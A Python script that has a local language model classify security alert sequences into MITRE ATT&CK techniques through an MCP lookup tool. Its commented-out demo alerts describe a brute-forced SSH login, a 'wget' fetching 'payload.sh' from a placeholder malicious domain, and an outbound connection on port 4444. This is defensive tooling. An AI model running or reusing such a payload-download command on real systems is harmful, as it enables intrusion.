from langchain_ollama import ChatOllama
from langchain_core.messages import SystemMessage, HumanMessage
from model_context_protocol.mcp_client import mcp_client
from pydantic import BaseModel
from typing import Optional
import asyncio
import json
from langchain_google_genai import ChatGoogleGenerativeAI
from langchain_groq import ChatGroq
from langchain_google_genai import ChatGoogleGenerativeAI


from dotenv import load_dotenv
load_dotenv() 

class MitreTechniqueResult(BaseModel):
    technique_id: Optional[str] = None
    technique_name: Optional[str] = None

# llm = ChatOllama(model="deepseek-r1:1.5b", temperature=0)
# llm = ChatOllama(model="qwen3:4b", temperature=0)
llm = ChatOllama(model="qwen2.5:3b", temperature=0)
# llm = ChatGoogleGenerativeAI(model="gemini-flash-latest", temperature=0)
# llm = ChatGroq(model="llama-3.3-70b-versatile", temperature=0)
# llm = ChatGoogleGenerativeAI(model="gemini-flash-latest", temperature=0)



structured_llm = llm.with_structured_output(MitreTechniqueResult)

async def get_mitre_technique_id(alert_log_sequence):
   print()
   print("ALERT SEQUENCE:", alert_log_sequence)
   print()

   tools = await mcp_client.get_tools()

   allowed_tool_names = (
       "get_technique_by_id",
    #    "get_techniques_by_tactic",
)

   tools_by_name = {}

   for tool in tools:
       if tool.name in allowed_tool_names:
           tools_by_name[tool.name] = tool

   filtered_tools = list(tools_by_name.values())
   for tool in filtered_tools:
       print("TOOL NAME:", tool.name)
       print("TOOL DESCRIPTION:", tool.description)
       print("TOOL ARGS SCHEMA:", tool.args)

   llm_with_tools = llm.bind_tools(filtered_tools)

   system_prompt = SystemMessage(content="""
        You are identifying the MITRE ATT&CK technique that best matches the alert sequence.

        Task: analyze the actual actions in the alerts (commands run, sessions opened, accounts used,
        files accessed) and identify the technique they show. Do not assume a category in advance.

        Call get_technique_by_id with that technique's MITRE ATT&CK ID to retrieve its ID and name.

        Output format:{
        "technique_id": "T-number"
        "technique_name": "name of the technique"
        }""")


#  sometimes model get confused in the prompts 
   tool_prompt = HumanMessage(content=f"Identify the relevant MITRE ATT&CK technique ID for these alert sequence: {alert_log_sequence}")

   ai_msg = await llm_with_tools.ainvoke([system_prompt, tool_prompt])

#    print(" LLM responded:", ai_msg.tool_calls)

   if not ai_msg.tool_calls:
       return None

   call = ai_msg.tool_calls[0]
   
   tool_to_use = filtered_tools[0]
  
   result = await tool_to_use.ainvoke(call["args"])
   print()
   print("TOOL RETURNED:", result)   
   print()

   parsed = json.loads(result[0]["text"])
   technique = parsed.get("technique", {})


   return MitreTechniqueResult(
        technique_id = technique.get("mitre_id"),
        technique_name = technique.get("name"),
   )

# this runs when i run this file so can leave it here for now dont need to change parameters
# if __name__ == "__main__":
#     demo_alert_log_sequence = [
#         {"rule_id": 1001, "timestamp": "2026-07-23T10:12:03Z", "host": "web-server-01", "message": "Multiple failed SSH login attempts for user 'admin' (12 attempts in 30s)"},
#         {"rule_id": 1002, "timestamp": "2026-07-23T10:12:35Z", "host": "web-server-01", "message": "Successful SSH login for user 'admin' after previous failures"},
#         {"rule_id": 1003, "timestamp": "2026-07-23T10:13:10Z", "host": "web-server-01", "message": "New process spawned: /usr/bin/wget http://malicious-domain.example/payload.sh"},
#         {"rule_id": 1004, "timestamp": "2026-07-23T10:13:45Z", "host": "web-server-01", "message": "Outbound connection to unusual external IP on port 4444"},
#     ]
#     result = asyncio.run(get_mitre_technique_id(demo_alert_log_sequence))
#     print(result)